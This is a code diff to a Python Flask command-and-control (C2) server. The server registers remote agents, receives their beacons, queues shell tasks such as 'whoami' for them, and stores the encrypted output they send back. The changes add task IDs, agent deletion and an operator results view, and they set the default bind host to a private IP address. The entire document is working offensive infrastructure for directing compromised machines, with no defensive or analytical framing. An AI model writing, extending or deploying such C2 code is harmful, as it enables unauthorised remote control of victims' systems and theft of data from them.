@@ -54,7 +54,7 @@ if not OPERATOR_TOKEN:
         "Set it before starting the server."
     )
 
-C2_HOST: str = os.environ.get("C2_HOST", "0.0.0.0")
+C2_HOST: str = os.environ.get("C2_HOST", "192.168.0.109")
 C2_PORT: int = int(os.environ.get("C2_PORT", "5000"))
 
 # Replay window: reject requests whose timestamp differs > this many seconds.
@@ -116,6 +116,7 @@ def init_db() -> None:
         CREATE TABLE IF NOT EXISTS results (
             id          INTEGER PRIMARY KEY AUTOINCREMENT,
             agent_id    TEXT NOT NULL,
+            task_id     INTEGER NOT NULL,
             output      TEXT,
             received_at REAL NOT NULL
         );
@@ -329,6 +330,71 @@ def register():
         return jsonify({"error": "registration failed"}), 400
 
 
+@app.route("/api/agent/<agent_id>", methods=["DELETE"])
+@require_operator
+def delete_agent(agent_id):
+    try:
+        db = get_db()
+
+        row = db.execute(
+            "SELECT 1 FROM agents WHERE agent_id = ?", (agent_id,)
+        ).fetchone()
+
+        if not row:
+            return jsonify({"error": "unknown agent"}), 404
+
+        db.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
+        db.execute("DELETE FROM results WHERE agent_id = ?", (agent_id,))
+        db.execute("DELETE FROM agents WHERE agent_id = ?", (agent_id,))
+
+        log.info("[+] Agent deleted: %s", agent_id)
+        return jsonify({"status": "deleted"}), 200
+
+    except Exception as e:
+        log.error("Delete error: %s", e)
+        return jsonify({"error": "delete failed"}), 500
+
+
+@app.route("/api/results/<agent_id>", methods=["GET"])
+@require_operator
+def get_results(agent_id):
+    try:
+        db = get_db()
+
+        row = db.execute(
+            "SELECT 1 FROM agents WHERE agent_id = ?",
+            (agent_id,)
+        ).fetchone()
+
+        if not row:
+            return jsonify({"error": "unknown agent"}), 404
+
+        rows = db.execute(
+            """SELECT t.id, t.payload, t.status, t.created_at, r.output, r.received_at 
+               FROM tasks t 
+               LEFT JOIN results r ON t.id = r.task_id 
+               WHERE t.agent_id = ? 
+               ORDER BY t.created_at DESC LIMIT 20""",
+            (agent_id,)
+        ).fetchall()
+
+        results = []
+        for r in rows:
+            d = dict(r)
+            try:
+                payload = json.loads(d["payload"])
+                d["type"] = payload.get("type", "unknown")
+                d["command"] = payload.get("command", "")
+            except:
+                d["type"] = "unknown"
+            results.append(d)
+
+        return jsonify(results), 200
+
+    except Exception as e:
+        log.error("Result fetch error: %s", e)
+        return jsonify({"error": "server error"}), 500
+
 @app.route("/api/status", methods=["POST"])
 @require_agent_auth
 def beacon():
@@ -361,6 +427,7 @@ def beacon():
         task_out = None
         if row:
             task_out = json.loads(row["payload"])
+            task_out["task_id"] = row["id"]  # Add task_id to the payload
             db.execute(
                 "UPDATE tasks SET status = 'delivered' WHERE id = ?", (row["id"],)
             )
@@ -383,12 +450,20 @@ def result():
     agent_id = request.agent_id
     try:
         data   = decrypt_from_agent(agent_id, request.get_data())
-        output = data.get("output", "")
-        get_db().execute(
-            "INSERT INTO results (agent_id, output, received_at) VALUES (?, ?, ?)",
-            (agent_id, output, time.time()),
+        task_id = data.get("task_id")
+        output  = data.get("output", "")
+
+        db = get_db()
+        db.execute(
+            "INSERT INTO results (agent_id, task_id, output, received_at) VALUES (?, ?, ?, ?)",
+            (agent_id, task_id, output, time.time()),
         )
-        log.info("[+] Result from %s: %s", agent_id, output[:120])
+        if task_id:
+            db.execute(
+                "UPDATE tasks SET status = 'completed' WHERE id = ?", (task_id,)
+            )
+        
+        log.info("[+] Result received from %s (task %s)", agent_id, task_id)
         return encrypt_for_agent(agent_id, {"status": "received"})
     except Exception as e:
         log.error("Result error for %s: %s", agent_id, e)
@@ -398,11 +473,6 @@ def result():
 @app.route("/api/push", methods=["POST"])
 @require_operator
 def push_task():
-    """
-    Operator task push — protected by OPERATOR_TOKEN.
-    Body (plaintext JSON):
-      {"agent_id": "...", "type": "shell", "command": "whoami"}
-    """
     try:
         data     = request.get_json(force=True, silent=True) or {}
         agent_id = data.get("agent_id", "")
@@ -416,18 +486,27 @@ def push_task():
         if not row:
             return jsonify({"error": "unknown agent"}), 404
 
-        get_db().execute(
-            "INSERT INTO tasks (agent_id, payload, status, created_at) VALUES (?, ?, 'pending', ?)",
+        db = get_db()
+        cursor = db.execute(
+            "INSERT INTO tasks (agent_id, payload, status, created_at) "
+            "VALUES (?, ?, 'pending', ?)",
             (agent_id, json.dumps(data), time.time()),
         )
-        log.info("[+] Task queued for %s: %s", agent_id, data.get("type"))
-        return jsonify({"status": f"task queued for {agent_id}"}), 200
+
+        task_id = cursor.lastrowid
+
+        log.info("[+] Task queued (%d) for %s: %s",
+                 task_id, agent_id, data.get("type"))
+
+        return jsonify({
+            "status": "queued",
+            "task_id": task_id
+        }), 200
 
     except Exception as e:
         log.error("Push error: %s", e)
         return jsonify({"error": "server error"}), 500
-
-
+    
 @app.route("/api/agents", methods=["GET"])
 @require_operator
 def list_agents():
